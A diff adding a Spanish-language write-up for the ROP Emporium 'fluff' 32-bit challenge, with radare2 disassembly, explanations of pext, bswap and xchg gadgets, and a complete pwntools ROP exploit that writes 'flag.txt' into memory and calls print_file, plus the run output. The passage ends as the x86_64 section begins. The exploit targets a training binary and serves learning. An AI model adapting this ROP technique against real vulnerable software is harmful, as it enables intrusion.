@@ -4,7 +4,173 @@
 
 Mi hardware no soporta bmi1 (binary manipulation instructions) por lo que tuve que emular otra cpu con qemu para poder probar mis exploits.
 
-# x86_64
+## x86
+
+En este reto debemos escribir en memoria de nuevo "flag.txt" y llamar a `print_file` pero esta vez contamos con gadgets mas complejos:
+```
+ r2 -A fluff32 2>/dev/null
+[0x080483f0]> pd 20 @ sym.usefulFunction
+/ 25: sym.usefulFunction ();
+|           0x0804852a      55             push ebp
+|           0x0804852b      89e5           mov ebp, esp
+|           0x0804852d      83ec08         sub esp, 8
+|           0x08048530      83ec0c         sub esp, 0xc
+|           0x08048533      68e0850408     push str.nonexistent        ; 0x80485e0 ; "nonexistent"
+|           0x08048538      e893feffff     call sym.imp.print_file
+|           0x0804853d      83c410         add esp, 0x10
+|           0x08048540      90             nop
+|           0x08048541      c9             leave
+\           0x08048542      c3             ret
+            ;-- questionableGadgets:
+            0x08048543      89e8           mov eax, ebp
+            0x08048545      bbbababab0     mov ebx, 0xb0bababa
+            0x0804854a      c4e262f5d0     pext edx, ebx, eax
+            0x0804854f      b8efbeadde     mov eax, 0xdeadbeef
+            0x08048554      c3             ret
+            0x08048555      8611           xchg byte [ecx], dl
+            0x08048557      c3             ret
+            0x08048558      59             pop ecx
+            0x08048559      0fc9           bswap ecx
+            0x0804855b      c3             ret
+```
+
+Tenemos estos gadgets:
+```
+    gadget_write_1 = 0x08048543   # mov eax, ebp; mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret
+    gadget_write_2 = 0x08048558   # pop ecx; bswap ecx; ret
+    gadget_write_3 = 0x08048555   #  xchg byte [ecx], dl; ret
+```
+
+El primero usa `pext`, una instruccion que toma `ebx`, le aplica la mascara `eax` y almacena los bits extraidos en `edx` (comienza a escribir los bits extraidos por el LSB)
+
+El segundo usa `bswap` que revierte el endianness de los bits; si es little-endian lo convierte a big-endian y viceversa.
+
+El tercero usa `xchg` que intercambia los valores entre los dos registros o, en este caso, direccion de memoria y registro.
+
+Referencia: https://www.felixcloutier.com/x86/
+
+Para escribir en memoria "flag.txt" hacemos los siguiente:
+1. Almacenamos cada byte de la cadena en `ebx` o mas bien en su parte baja: `dl`, usando el primer gadget
+2. Almacenamos la direccion de `.data` en ecx usando el segundo gadget.
+3. Escribimos el byte de la cadena en `dl` hacia `.data`.
+
+### Paso 1
+`pext` se comporta de la siguiente manera:
+
+![2025-05-31-223936_583x227_scrot](https://github.com/user-attachments/assets/c0dfb75e-bfe0-4f92-92e7-86c5cc624851)
+
+Debemos crear un algoritmo que dado el valor que tenemos de `ebx` nos pueda crear una mascara para obtener cada byte particular:
+``` python
+def find_mask(x):
+    obj_bits = [1 if  x & (1 << (7-n)) else 0 for n in range(8)]
+    obj_bits.reverse() # PEXT compacts from MSB to LSB
+
+    ebx = 0xb0bababa
+    mask_bits = []
+    n = 0
+    for i in range(ebx.bit_length()):
+        if n >= len(obj_bits):
+            break
+        ebx_bit = (ebx >> i) & 1
+        if obj_bits[n] == ebx_bit:
+            mask_bits.append(1)
+            n+=1
+        else:
+            mask_bits.append(0)
+    
+    mask_bits.reverse() # LSB-first to MSB-first
+    mask = 0
+    for bit in mask_bits:
+           mask = (mask << 1) | bit
+    return p32(mask)
+```
+
+### Paso 2
+Empaquetamos `.data`+offset en big-endian: `p32(data_addr + i,endian="big")` para que al invertirse acabe en little-endian.
+
+### Paso 3
+Escribimos el valor almacenado en `dl` en `.data`+offset.
+
+Exploit:
+``` python
+from pwn import *
+import sys
+
+data_addr = 0x0804a018
+print_file_addr = 0x080483d0
+
+# populate edx
+gadget_write_0 = 0x080485bb    # pop ebp ; ret
+gadget_write_1 = 0x08048543   # mov eax, ebp; mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret 
+# populate ecx
+gadget_write_2 = 0x08048558   # pop ecx; bswap ecx; ret
+# write to memory
+gadget_write_3 = 0x08048555   #  xchg byte [ecx], dl; ret
+
+
+def find_mask(x):
+    obj_bits = [1 if  x & (1 << (7-n)) else 0 for n in range(8)]
+    obj_bits.reverse() # PEXT compacts from MSB to LSB
+
+    ebx = 0xb0bababa
+    mask_bits = []
+    n = 0
+    for i in range(ebx.bit_length()):
+        if n >= len(obj_bits):
+            break
+        ebx_bit = (ebx >> i) & 1
+        if obj_bits[n] == ebx_bit:
+            mask_bits.append(1)
+            n+=1
+        else:
+            mask_bits.append(0)
+    
+    mask_bits.reverse() # LSB-first to MSB-first
+    mask = 0
+    for bit in mask_bits:
+           mask = (mask << 1) | bit
+    return p32(mask)
+
+def write_in_data(data):
+    p = b""
+    # Write "flag.txt"
+    for i in range(len(data)):
+        # Step 1
+        p += p32(gadget_write_0)
+        #p += p32(0) 
+        p += find_mask(data[i]) # SIGILL ??? 
+        p += p32(gadget_write_1)
+        # Step 2
+        p += p32(gadget_write_2)
+        p += p32(data_addr + i,endian="big")
+        # Step 3
+        p += p32(gadget_write_3)
+    return p
+
+payload = b"A" * 44
+payload += write_in_data(b"flag.txt")  # write "flag.txt" en .data
+payload += p32(print_file_addr)        # print_file("flag.txt")
+payload += p32(0)                      # ebp
+payload += p32(data_addr)              # "flag.txt"
+
+sys.stdout.buffer.write(payload)
+```
+
+```
+qemu-i386 -cpu Haswell ./fluff32 <<< $(python3 s.py)
+qemu-i386: warning: TCG doesn't support requested feature: CPUID.07H:EBX.hle [bit 4]
+qemu-i386: warning: TCG doesn't support requested feature: CPUID.07H:EBX.rtm [bit 11]
+fluff by ROP Emporium
+x86
+
+You know changing these strings means I have to rewrite my solutions...
+> Thank you!
+ROPE{a_placeholder_32byte_flag!}
+qemu: uncaught target signal 11 (Segmentation fault) - core dumped
+zsh: segmentation fault  qemu-i386 -cpu Haswell ./fluff32 <<< $(python3 s.py)
+```
+
+## x86_64
 
 Mas o menos la misma historia, revisamos `usefulGadgets` y tenemos estos:
 ```
